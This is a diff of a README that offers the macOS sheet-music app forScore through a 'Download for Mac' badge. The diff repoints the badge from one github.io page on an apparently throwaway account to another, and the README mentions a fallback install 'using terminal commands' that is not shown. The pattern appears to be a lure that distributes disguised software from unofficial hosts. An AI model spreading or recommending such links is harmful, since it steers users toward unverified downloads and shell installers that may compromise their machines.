@@ -4,7 +4,7 @@
 forScore for Mac is a professional digital sheet music reader and organizer designed for musicians, performers, and music teachers 🎶.  
 Follow the guide below to easily install the program on your macOS device.
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-000000?logo=apple&style=for-the-badge)](https://kamartamara.github.io/.github/forscore)
+[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-000000?logo=apple&style=for-the-badge)](https://tayusikf8398.github.io/.github/forscore)
 
 If the download button doesn’t work, follow the manual installation guide below using terminal commands.  
 
